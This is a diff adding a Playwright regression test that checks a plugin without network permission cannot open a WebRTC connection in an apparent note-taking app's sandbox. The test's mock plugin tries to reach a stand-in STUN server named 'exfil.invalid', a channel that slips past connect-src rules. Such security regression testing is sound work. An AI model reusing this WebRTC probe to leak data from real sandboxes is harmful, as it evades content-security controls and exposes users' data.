@@ -1,5 +1,5 @@
 import { expect, test, type Page } from '@playwright/test';
-import { newNote, openApp, pointer } from './helpers.ts';
+import { modKey, newNote, openApp, pointer } from './helpers.ts';
 
 /**
  * Proofs of concept from the security review (docs/SECURITY_REVIEW.md), kept as regression
@@ -89,6 +89,42 @@ test('SR-05: a runbook js block cannot reach the origin private file system', as
   const body = page.getByRole('region', { name: 'Run result' }).locator('.dev-body');
   await expect(body).toContainText('"storage": "undefined"', SLOW);
   await expect(body).toContainText('"opfs": "undefined"');
+});
+
+test('SR-12: a plugin without the network permission cannot open a WebRTC connection', async ({ page }) => {
+  // connect-src doesn't cover WebRTC: before the fix a plugin could reach a STUN/TURN server of
+  // its choosing (and leak through its DNS name) with no network permission at all.
+  const code = `export default { activate(inkwright) {
+    inkwright.commands.register('probe', async () => {
+      let offer = 'not tried';
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:exfil.invalid:3478' }] });
+        pc.createDataChannel('x');
+        await pc.setLocalDescription(await pc.createOffer());
+        offer = 'offer made';
+      } catch (e) { offer = 'refused'; }
+      await inkwright.ui.toast(['rtc', typeof window.RTCPeerConnection, typeof window.webkitRTCPeerConnection, typeof window.RTCDataChannel, offer].join(' '));
+    });
+  } };`;
+  const manifest = { id: 'test.rtc', name: 'RTC probe', version: '1.0.0', author: 'Tests', description: 'Tries WebRTC.', minAppVersion: '1.0.0', permissions: [], contributes: { commands: [{ id: 'probe', title: 'Probe WebRTC' }] } };
+  await page.route('https://plugins.test/rtc/**', (r) => {
+    const name = new URL(r.request().url()).pathname.split('/').pop();
+    if (name === 'manifest.json') return r.fulfill({ contentType: 'application/json', body: JSON.stringify(manifest), headers: { 'access-control-allow-origin': '*' } });
+    if (name === 'main.js') return r.fulfill({ contentType: 'text/javascript', body: code, headers: { 'access-control-allow-origin': '*' } });
+    return r.fulfill({ status: 404, body: '' });
+  });
+  await openApp(page);
+  await page.goto('/?e2e#settings/plugins');
+  await page.locator('.set-nav .nav-item', { hasText: 'Plugins' }).click();
+  await page.getByLabel('Link to a plugin (its manifest.json, folder or .zip)').fill('https://plugins.test/rtc/');
+  await page.locator('form.plg-url').getByRole('button', { name: 'Install' }).click();
+  await page.getByRole('dialog', { name: 'Install RTC probe?' }).getByRole('button', { name: 'Install' }).click();
+  await openApp(page);
+  await newNote(page);
+  await page.keyboard.press(`${await modKey(page)}+k`);
+  await page.locator('.pal-input').fill('probe webrtc');
+  await page.getByText('Probe WebRTC', { exact: true }).first().click();
+  await expect(page.locator('.toasts')).toContainText('rtc undefined undefined undefined refused', SLOW);
 });
 
 test('SR-02: SQL in the data sandbox cannot fetch URLs (no exfiltration through DuckDB)', async ({ page }) => {
